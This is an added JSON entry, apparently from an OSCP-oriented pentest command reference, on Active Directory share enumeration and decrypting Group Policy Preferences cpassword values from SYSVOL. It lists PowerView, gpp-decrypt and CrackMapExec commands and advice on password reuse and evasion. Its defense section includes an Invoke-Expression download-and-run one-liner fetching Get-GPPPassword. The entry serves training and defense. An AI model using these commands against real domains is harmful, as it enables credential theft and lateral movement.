@@ -1,0 +1,115 @@
+{
+  "id": "ad-find-domainshare",
+  "name": "AD Enumeration - Domain Share Discovery & SYSVOL Hunting",
+  "command": "Find-DomainShare\nls \\\\<dc_host>\\sysvol\\<domain>\\Policies\\",
+  "description": "Enumerate all accessible SMB shares across every domain computer, then hunt SYSVOL for Group Policy Preferences (GPP) files containing encrypted passwords. GPP cpassword values use AES-256 but Microsoft published the key in 2012 \u2014 any cpassword found is trivially decryptable with gpp-decrypt. SYSVOL is world-readable by all authenticated domain users, making this a reliable low-hanging-fruit check.",
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "domain-joined"
+  ],
+  "tools": [
+    "powerview",
+    "gpp-decrypt"
+  ],
+  "tags": [
+    "active-directory",
+    "ad-enum",
+    "shares",
+    "sysvol",
+    "gpp",
+    "cpassword",
+    "powerview"
+  ],
+  "category": "Enumeration",
+  "subcategory": "Active Directory",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 21: Active Directory Introduction and Enumeration (21.3.5)",
+  "examples": [
+    {
+      "label": "Find all domain shares (PowerView - runs from domain-joined Windows)",
+      "command": "Find-DomainShare"
+    },
+    {
+      "label": "List SYSVOL policies folder on the DC",
+      "command": "ls \\\\dc1.corp.com\\sysvol\\corp.com\\Policies\\"
+    },
+    {
+      "label": "Recurse into a specific policy folder looking for Groups.xml / Scripts.ini",
+      "command": "ls \\\\dc1.corp.com\\sysvol\\corp.com\\Policies\\ -Recurse | Where-Object {$_.Name -match 'Groups.xml|Scripts.ini|Services.xml|ScheduledTasks.xml'}"
+    },
+    {
+      "label": "Read a Groups.xml file (contains cpassword attribute)",
+      "command": "cat \\\\dc1.corp.com\\sysvol\\corp.com\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml"
+    },
+    {
+      "label": "Decrypt a GPP cpassword (run on Kali)",
+      "command": "gpp-decrypt \"+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE\""
+    },
+    {
+      "label": "CrackMapExec spider_plus to find interesting files on shares (from Linux)",
+      "command": "crackmapexec smb <dc_ip> -u <user> -p <password> -M spider_plus --share 'SYSVOL'"
+    },
+    {
+      "label": "Browse a non-SYSVOL share for sensitive files",
+      "command": "ls \\\\<target>\\<share>\\docs\\\ncat \\\\<target>\\<share>\\docs\\credentials.txt"
+    }
+  ],
+  "notes": "GPP cpassword files are found in SYSVOL under Policies\\{GUID}\\{Machine|User}\\Preferences\\Groups\\Groups.xml, Services\\Services.xml, ScheduledTasks\\ScheduledTasks.xml, or Datasources\\DataSources.xml. The AES key was published by Microsoft (MS14-025) \u2014 any cpassword value is decryptable regardless of age. Find-DomainShare scans every domain computer so it is noisy; target dc1/SYSVOL first for quick wins before broad scanning. After gpp-decrypt, try the password immediately against all domain accounts (password reuse). Also check non-SYSVOL shares for readme files, scripts, and config files containing credentials.",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Active Directory Introduction and Enumeration",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "PowerView - GitHub (PowerSploit)",
+      "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
+    },
+    {
+      "title": "MS14-025 - GPP Password Exposure",
+      "url": "https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-gpp-decrypt",
+      "rel": "next",
+      "note": "Use gpp-decrypt on any cpassword value found in SYSVOL."
+    },
+    {
+      "id": "ad-cme-shares",
+      "rel": "alternative",
+      "note": "CrackMapExec --shares is the Linux equivalent of Find-DomainShare."
+    },
+    {
+      "id": "ad-cme-spider",
+      "rel": "next",
+      "note": "After finding interesting shares, spider_plus recursively indexes all files."
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1135",
+    "T1552.006"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Domain shares including SYSVOL (\\\\domain\\SYSVOL) and NETLOGON are accessible to all domain users by default. SYSVOL contains Group Policy files \u2014 including legacy GPP (Group Policy Preferences) XML files that store credentials encrypted with a publicly known AES key (MS14-025). Enumeration with Find-DomainShare or net view reveals non-standard shares, and SYSVOL contains Group Policy infrastructure that may include scripts, credentials, or attack-path data.",
+    "prerequisites": "Any domain user. SMB access (port 445) to DC and other hosts. PowerView/Invoke-ShareFinder for automation. net view for manual enumeration.",
+    "impact": "T1135 Network Share Discovery + T1552.006 Unsecured Credentials: Group Policy Preferences. Discovers file shares for data exfiltration paths. SYSVOL GPP XML files with cpassword field contain AES-encrypted credentials crackable with Get-GPPPassword or gpp-decrypt \u2014 direct credential discovery without any privilege.",
+    "detection": "High volume of \\\\host\\C$ or \\\\host\\SYSVOL access attempts from a single workstation in a short window. Event 5140 (network share accessed) in bulk. Sysmon Event 3: rapid SMB connections to many hosts. MDI: 'SMB network share enumeration'. Event 4688: Invoke-ShareFinder or PowerView process.\nMonitor for unusual processes or command-line arguments such as net view, net share, Get-SmbShare, or ShareFinder. System and network discovery techniques often occur throughout an operation as new information is discovered. Data and events should not be viewed in isolation but as part of a chain of behavior (DET0155).",
+    "artifacts": "Event 5140: bulk share access from workstation | MDI: share enumeration alert | Sysmon Event 3: rapid SMB to many hosts | PowerShell Event 4104: Find-DomainShare / Invoke-ShareFinder | SYSVOL XML files with cpassword field accessed",
+    "prevention": "Remove all GPP credentials from SYSVOL immediately (MS14-025 patch does not remove existing files). Script to find and delete: Find-GPOPasswords.ps1 or CrackMapExec --gpp-passwords. Audit SYSVOL for scripts and credential files regularly. Restrict access to sensitive shares (not accessible to all domain users). Monitor Event 5140 for bulk share access.\nOperating System Configuration: Enable Windows firewall or use third-party firewall to prevent file/printer sharing if not needed.\nNetwork Segmentation: Segment networks to prevent unauthenticated access to network shares; limit exposure of file servers.",
+    "evasion": "Access SYSVOL directly (always accessible, doesn't trigger share enumeration alerts). Process one share at a time with delays. Read specific known paths (\\\\domain\\SYSVOL\\domain\\Policies) rather than scanning all shares.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1135/",
+      "https://attack.mitre.org/techniques/T1552/006/"
+    ],
+    "misconfiguration": "GPP XML files with cpassword attribute still in SYSVOL (from pre-MS14-025 GPO creation). Sensitive scripts in SYSVOL. Non-standard shares with weak permissions. No monitoring of bulk SYSVOL access.",
+    "vulnerable_config": "# GPP cpassword in SYSVOL (legacy \u2014 still present if never cleaned up):\n# \\\\corp.local\\SYSVOL\\corp.local\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml\n# <Properties action='U' newName='' fullName='' description=''\n#   cpassword='edBSHOwhZLTjt/QS9FeIcJ8m9MZfl7QEVF6vMJopZhI=' ...>\n# \u2192 gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ8m9MZfl7QEVF6vMJopZhI=' \u2192 cleartext password",
+    "secure_config": "# Find and remove GPP cpassword files:\nGet-ChildItem -Path '\\\\corp.local\\SYSVOL' -Recurse -Include '*.xml' | Select-String 'cpassword'\n# Remove any files found OR remove the cpassword element\n\n# Microsoft KB2962486 (MS14-025) prevents NEW GPP passwords but doesn't remove old ones:\n# Must manually audit and clean SYSVOL\n\n# SIEM alert for GPP cpassword access:\n# Event 5140: ObjectName contains 'Groups.xml' OR 'DataSources.xml' OR 'ScheduledTasks.xml'\n# AND AccessMask=0x80 (read) \u2192 ALERT\n\n# Audit SYSVOL regularly:\nInvoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')\nGet-GPPPassword"
+  }
+}
